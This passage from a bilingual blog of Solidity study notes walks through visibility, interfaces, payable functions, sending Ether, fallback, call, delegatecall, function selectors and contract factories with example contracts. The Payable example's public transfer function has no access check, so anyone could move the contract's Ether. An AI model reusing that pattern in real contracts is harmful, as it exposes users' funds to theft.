&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;public function called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// External functions can only be called</span></span><br><span class="line">    <span class="comment">// - by other contracts and accounts</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">externalFunc</span>(<span class="params"></span>) external pure returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;external function called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function will not compile since we&#x27;re trying to call</span></span><br><span class="line">    <span class="comment">// an external function here.</span></span><br><span class="line">    <span class="comment">// function testExternalFunc() public pure returns (string memory) &#123;</span></span><br><span class="line">    <span class="comment">//     return externalFunc();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// State variables</span></span><br><span class="line">    string private privateVar = <span class="string">&quot;my private variable&quot;</span>;</span><br><span class="line">    string internal internalVar = <span class="string">&quot;my internal variable&quot;</span>;</span><br><span class="line">    string public publicVar = <span class="string">&quot;my public variable&quot;</span>;</span><br><span class="line">    <span class="comment">// State variables cannot be external so this code won&#x27;t compile.</span></span><br><span class="line">    <span class="comment">// string external externalVar = &quot;my external variable&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Child</span> is <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="comment">// Inherited contracts do not have access to private functions</span></span><br><span class="line">    <span class="comment">// and state variables.</span></span><br><span class="line">    <span class="comment">// function testPrivateFunc() public pure returns (string memory) &#123;</span></span><br><span class="line">    <span class="comment">//     return privateFunc();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Internal function call be called inside child contracts.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testInternalFunc</span>(<span class="params"></span>) public pure override returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">internalFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Interface:</h1>
<p>You can interact with other contracts by declaring an Interface.</p>
<p>Interface</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>cannot have any functions implemented</p>
</li>
<li class="lvl-2">
<p>can inherit from other interfaces</p>
</li>
<li class="lvl-2">
<p>all declared functions must be external</p>
</li>
<li class="lvl-2">
<p>cannot declare a constructor</p>
</li>
<li class="lvl-2">
<p>cannot declare state variables</p>
</li>
</ul>
<p>您可以通过声明一个Interface与其他合约进行交互。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>接口不能有任何实现的函数</p>
</li>
<li class="lvl-2">
<p>可以从其他接口继承</p>
</li>
<li class="lvl-2">
<p>所有声明的函数必须是外部的</p>
</li>
<li class="lvl-2">
<p>不能声明构造函数</p>
</li>
<li class="lvl-2">
<p>不能声明状态变量</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Counter</span> &#123;</span><br><span class="line">    uint public count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ICounter</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">count</span>(<span class="params"></span>) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MyContract</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">incrementCounter</span>(<span class="params">address _counter</span>) external &#123;</span><br><span class="line">        <span class="title class_">ICounter</span>(_counter).<span class="title function_">increment</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getCount</span>(<span class="params">address _counter</span>) external view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">ICounter</span>(_counter).<span class="title function_">count</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uniswap example</span></span><br><span class="line">interface <span class="title class_">UniswapV2Factory</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPair</span>(<span class="params">address tokenA, address tokenB</span>)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (address pair);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">UniswapV2Pair</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getReserves</span>(<span class="params"></span>)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (</span><br><span class="line">            uint112 reserve0,</span><br><span class="line">            uint112 reserve1,</span><br><span class="line">            uint32 blockTimestampLast</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">UniswapExample</span> &#123;</span><br><span class="line">    address private factory = <span class="number">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span>;</span><br><span class="line">    address private dai = <span class="number">0x6B175474E89094C44Da98b954EedeAC495271d0F</span>;</span><br><span class="line">    address private weth = <span class="number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getTokenReserves</span>(<span class="params"></span>) external view returns (uint, uint) &#123;</span><br><span class="line">        address pair = <span class="title class_">UniswapV2Factory</span>(factory).<span class="title function_">getPair</span>(dai, weth);</span><br><span class="line">        (uint reserve0, uint reserve1, ) = <span class="title class_">UniswapV2Pair</span>(pair).<span class="title function_">getReserves</span>();</span><br><span class="line">        <span class="keyword">return</span> (reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Payable:</h1>
<p>Functions and addresses declared <code>payable</code> can receive <code>ether</code> into the contract.<br />
接受ether，不是其他Token</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Payable</span> &#123;</span><br><span class="line">    <span class="comment">// Payable address can receive Ether</span></span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Payable constructor can receive Ether</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;</span><br><span class="line">        owner = <span class="title function_">payable</span>(msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to deposit Ether into this contract.</span></span><br><span class="line">    <span class="comment">// Call this function along with some Ether.</span></span><br><span class="line">    <span class="comment">// The balance of this contract will be automatically updated.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call this function along with some Ether.</span></span><br><span class="line">    <span class="comment">// The function will throw an error since this function is not payable.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notPayable</span>(<span class="params"></span>) public &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to withdraw all Ether from this contract.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="comment">// get the amount of Ether stored in this contract</span></span><br><span class="line">        uint amount = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// send all Ether to owner</span></span><br><span class="line">        <span class="comment">// Owner can receive Ether since the address of owner is payable</span></span><br><span class="line">        (bool success, ) = owner.<span class="property">call</span>&#123;<span class="attr">value</span>: amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to transfer Ether from this contract to address from input</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address payable _to, uint _amount</span>) public &#123;</span><br><span class="line">        <span class="comment">// Note that &quot;to&quot; is declared as payable</span></span><br><span class="line">        (bool success, ) = _to.<span class="property">call</span>&#123;<span class="attr">value</span>: _amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Sending Ether - Transfer, Send, and Call:</h1>
<h2 id="How-to-send-Ether">How to send Ether?</h2>
<p>You can send Ether to other contracts by</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>transfer</code> (2300 gas, throws error)</p>
</li>
<li class="lvl-2">
<p><code>send</code> (2300 gas, returns bool)</p>
</li>
<li class="lvl-2">
<p><code>call</code> (forward all gas or set gas, returns bool)</p>
</li>
</ul>
<h2 id="How-to-receive-Ether">How to receive Ether?</h2>
<p>A contract receiving Ether must have at least one of the functions below</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>receive() external payable</code></p>
</li>
<li class="lvl-2">
<p><code>fallback() external payable</code></p>
</li>
</ul>
<p>receive() is called if msg.data is empty, otherwise fallback() is called.</p>
<h2 id="Which-method-should-you-use">Which method should you use?</h2>
<p><code>call</code> in combination with re-entrancy guard is the recommended method to use after December 2019.注意防重入</p>
<p>Guard against re-entrancy by</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>making all state changes before calling other contracts 在调用其他合约之前，执行完所有的状态变量更改</p>
</li>
<li class="lvl-2">
<p>using re-entrancy guard modifier</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">ReceiveEther</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Which function is called, fallback() or receive()?</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           send Ether</span></span><br><span class="line"><span class="comment">               |</span></span><br><span class="line"><span class="comment">         msg.data is empty?</span></span><br><span class="line"><span class="comment">              / \</span></span><br><span class="line"><span class="comment">            yes  no</span></span><br><span class="line"><span class="comment">            /     \</span></span><br><span class="line"><span class="comment">receive() exists?  fallback()</span></span><br><span class="line"><span class="comment">         /   \</span></span><br><span class="line"><span class="comment">        yes   no</span></span><br><span class="line"><span class="comment">        /      \</span></span><br><span class="line"><span class="comment">    receive()   fallback()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to receive Ether. msg.data must be empty</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fallback function is called when msg.data is not empty</span></span><br><span class="line">    <span class="title function_">fallback</span>() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getBalance</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SendEther</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sendViaTransfer</span>(<span class="params">address payable _to</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// This function is no longer recommended for sending Ether.</span></span><br><span class="line">        <span class="comment">// 不推荐</span></span><br><span class="line">        _to.<span class="title function_">transfer</span>(msg.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sendViaSend</span>(<span class="params">address payable _to</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// Send returns a boolean value indicating success or failure.</span></span><br><span class="line">        <span class="comment">// This function is not recommended for sending Ether.</span></span><br><span class="line">        <span class="comment">// 不推荐</span></span><br><span class="line">        bool sent = _to.<span class="title function_">send</span>(msg.<span class="property">value</span>);</span><br><span class="line">        <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sendViaCall</span>(<span class="params">address payable _to</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// Call returns a boolean value indicating success or failure.</span></span><br><span class="line">        <span class="comment">// This is the current recommended method to use.</span></span><br><span class="line">        <span class="comment">// 推荐</span></span><br><span class="line">        (bool sent, bytes memory data) = _to.<span class="property">call</span>&#123;<span class="attr">value</span>: msg.<span class="property">value</span>&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Fallback:</h1>
<p><code>fallback</code> is a function that does not take any arguments and does not return anything.<br />
一个不接受任何参数且不返回任何内容的函数<br />
It is executed either when 在何时执行</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>a function that does not exist is called or  调用不存在的函数</p>
</li>
<li class="lvl-2">
<p>Ether is sent directly to a contract but <code>receive()</code> does not exist or <code>msg.data</code> is not empty 以太币直接发送到合约但receive()不存在或msg.data不为空</p>
</li>
</ul>
<p><code>fallback</code> has a 2300 gas limit when called by transfer or send.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallback</span> &#123;</span><br><span class="line">    event <span class="title class_">Log</span>(uint gas);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fallback function must be declared as external. 回退函数的可见性必须声明为external</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>() external payable &#123;</span><br><span class="line">        <span class="comment">// send / transfer (forwards 2300 gas to this fallback function)</span></span><br><span class="line">        <span class="comment">// call (forwards all of the gas)</span></span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="title function_">gasleft</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper function to check the balance of this contract</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getBalance</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SendToFallback</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferToFallback</span>(<span class="params">address payable _to</span>) public payable &#123;</span><br><span class="line">        _to.<span class="title function_">transfer</span>(msg.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">callFallback</span>(<span class="params">address payable _to</span>) public payable &#123;</span><br><span class="line">        (bool sent, ) = _to.<span class="property">call</span>&#123;<span class="attr">value</span>: msg.<span class="property">value</span>&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Call:</h1>
<p><code>call</code> is a low level function to interact with other contracts.<br />
This is the recommended method to use when you’re just sending Ether via calling the <code>fallback</code> function.<br />
However it is not the recommend way to call existing functions. 不是调用现有函数的推荐方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Receiver</span> &#123;</span><br><span class="line">    event <span class="title class_">Received</span>(address caller, uint amount, string message);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>() external payable &#123;</span><br><span class="line">        emit <span class="title class_">Received</span>(msg.<span class="property">sender</span>, msg.<span class="property">value</span>, <span class="string">&quot;Fallback was called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">string memory _message, uint _x</span>) public payable returns (uint) &#123;</span><br><span class="line">        emit <span class="title class_">Received</span>(msg.<span class="property">sender</span>, msg.<span class="property">value</span>, _message);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _x + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Caller</span> &#123;</span><br><span class="line">    event <span class="title class_">Response</span>(bool success, bytes data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let&#x27;s imagine that contract B does not have the source code for</span></span><br><span class="line">    <span class="comment">// B合约未开源</span></span><br><span class="line">    <span class="comment">// contract A, but we do know the address of A and the function to call.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testCallFoo</span>(<span class="params">address payable _addr</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// You can send ether and specify a custom gas amount</span></span><br><span class="line">        (bool success, bytes memory data) = _addr.<span class="property">call</span>&#123;<span class="attr">value</span>: msg.<span class="property">value</span>, <span class="attr">gas</span>: <span class="number">5000</span>&#125;(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;foo(string,uint256)&quot;</span>, <span class="string">&quot;call foo&quot;</span>, <span class="number">123</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Response</span>(success, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Calling a function that does not exist triggers the fallback function.</span></span><br><span class="line">    <span class="comment">// 调用不存在的函数会触发回退函数。</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testCallDoesNotExist</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        (bool success, bytes memory data) = _addr.<span class="title function_">call</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;doesNotExist()&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Response</span>(success, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Delegatecall:</h1>
<p><code>delegatecall</code> is a low level function similar to <code>call</code>.<br />
When contract <code>A</code> executes <code>delegatecall</code> to contract <code>B</code>, <code>B</code>’s code is excuted<code>with contract</code>A<code>'s storage, </code>msg.sender<code>and</code>msg.value`.</p>
<p>好好理解一下委托的含义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Deploy this contract first</span></span><br><span class="line">contract B &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> storage layout must be the same as contract A</span></span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setVars</span>(<span class="params">uint _num</span>) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.<span class="property">sender</span>;</span><br><span class="line">        value = msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setVars</span>(<span class="params">address _contract, uint _num</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// A&#x27;s storage is set, B is not modified.</span></span><br><span class="line">        (bool success, bytes memory data) = _contract.<span class="title function_">delegatecall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;setVars(uint256)&quot;</span>, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220714005053.png" alt="20220714005053" /></p>
<h1>Function Selector:</h1>
<p>When a function is called, the first 4 bytes of <code>calldata</code> specifies which function to call.<br />
This 4 bytes is called a function selector.<br />
调用函数时，前 4 个字节calldata指定调用哪个函数。这 4 个字节称为函数选择器。像路由。🤨🤨🤨</p>
<p>Take for example, this code below. It uses <code>call</code> to execute <code>transfer</code> on a contract at the address <code>addr</code>.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">addr.<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;transfer(address,uint256)&quot;</span>, 0xSomeAddress, <span class="number">123</span>))</span><br></pre></td></tr></table></figure>
<p>The first 4 bytes returned from <code>abi.encodeWithSignature(....)</code> is the function selector.<br />
Perhaps you can save a tiny amount of gas if you precompute and inline the function selector in your code?<br />
如果您在代码中预先计算并内联函数选择器，也许您可​​以节省少量gas？<br />
Here is how the function selector is computed.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">FunctionSelector</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    &quot;transfer(address,uint256)&quot;</span></span><br><span class="line"><span class="comment">    0xa9059cbb</span></span><br><span class="line"><span class="comment">    &quot;transferFrom(address,address,uint256)&quot;</span></span><br><span class="line"><span class="comment">    0x23b872dd</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getSelector</span>(<span class="params">string calldata _func</span>) external pure returns (bytes4) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">bytes4</span>(<span class="title function_">keccak256</span>(<span class="title function_">bytes</span>(_func)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Calling Other Contract:</h1>
<p>Contract can call other contracts in 2 ways. 可以通过 2 种方式调用其他合约。(不是4种吗?)<br />
The easiest way to is to just call it, like <code>A.foo(x, y, z)</code>.<br />
Another way to call other contracts is to use the low-level <code>call</code>. 不推荐<br />
This method is not recommended.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Callee</span> &#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setX</span>(<span class="params">uint _x</span>) public returns (uint) &#123;</span><br><span class="line">        x = _x;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setXandSendEther</span>(<span class="params">uint _x</span>) public payable returns (uint, uint) &#123;</span><br><span class="line">        x = _x;</span><br><span class="line">        value = msg.<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (x, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Caller</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setX</span>(<span class="params">Callee _callee, uint _x</span>) public &#123;</span><br><span class="line">        uint x = _callee.<span class="title function_">setX</span>(_x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setXFromAddress</span>(<span class="params">address _addr, uint _x</span>) public &#123;</span><br><span class="line">        <span class="title class_">Callee</span> callee = <span class="title class_">Callee</span>(_addr);</span><br><span class="line">        callee.<span class="title function_">setX</span>(_x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setXandSendEther</span>(<span class="params">Callee _callee, uint _x</span>) public payable &#123;</span><br><span class="line">        (uint x, uint value) = _callee.<span class="property">setXandSendEther</span>&#123;<span class="attr">value</span>: msg.<span class="property">value</span>&#125;(_x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Creating Contracts from a Contract:</h1>
<p>Contract that Creates other Contracts<br />
Contracts can be created by other contracts using the <code>new</code> keyword. Since 0.8.0, <code>new</code> keyword supports <code>create2</code> feature by specifying <code>salt</code> options.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Car</span> &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    string public model;</span><br><span class="line">    address public carAddr;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _owner, string memory _model</span>) payable &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">        model = _model;</span><br><span class="line">        carAddr = <span class="title function_">address</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CarFactory</span> &#123;</span><br><span class="line">    <span class="title class_">Car</span>[] public cars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">create</span>(<span class="params">address _owner, string memory _model</span>) public &#123;</span><br><span class="line">        <span class="title class_">Car</span> car = <span class="keyword">new</span> <span class="title class_">Car</span>(_owner, _model);</span><br><span class="line">        cars.<span class="title function_">push</span>(car);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createAndSendEther</span>(<span class="params">address _owner, string memory _model</span>) public payable &#123;</span><br><span class="line">        <span class="title class_">Car</span> car = (<span class="keyword">new</span> <span class="title class_">Car</span>)&#123;<span class="attr">value</span>: msg.<span class="property">value</span>&#125;(_owner, _model);</span><br><span class="line">        cars.<span class="title function_">push</span>(car);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">create2</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _owner,</span></span><br><span class="line"><span class="params">        string memory _model,</span></span><br><span class="line"><span class="params">        bytes32 _salt</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        <span class="title class_">Car</span> car = (<span class="keyword">new</span> <span class="title class_">Car</span>)&#123;<span class="attr">salt</span>: _salt&#125;(_owner, _model);</span><br><span class="line">        cars.<span class="title function_">push</span>(car);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">create2AndSendEther</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _owner,</span></span><br><span class="line"><span class="params">        string memory _model,</span></span><br><span class="line"><span class="params">        bytes32 _salt</span></span><br><span class="line"><span class="params">    </span>) public payable &#123;</span><br><span class="line">        <span class="title class_">Car</span> car = (<span class="keyword">new</span> <span class="title class_">Car</span>)&#123;<span class="attr">value</span>: msg.<span class="property">value</span>, <span class="attr">salt</span>: _salt&#125;(_owner, _model);</span><br><span class="line">        cars.<span class="title function_">push</span>(car);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getCar</span>(<span class="params">uint _index</span>)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (</span><br><span class="line">            address owner,</span><br><span class="line">            string memory model,</span><br><span class="line">            address carAddr,</span><br><span class="line">            uint balance</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">Car</span> car = cars[_index];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (car.<span class="title function_">owner</span>(), car.<span class="title function_">model</span>(), car.<span class="title function_">carAddr</span>(), <span class="title function_">address</span>(car).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Try / Catch:</h1>
<p><code>try / catch</code> can only catch errors from external function calls and contract creation. 只能从外部函数调用和合约创建中捕获错误。</p>
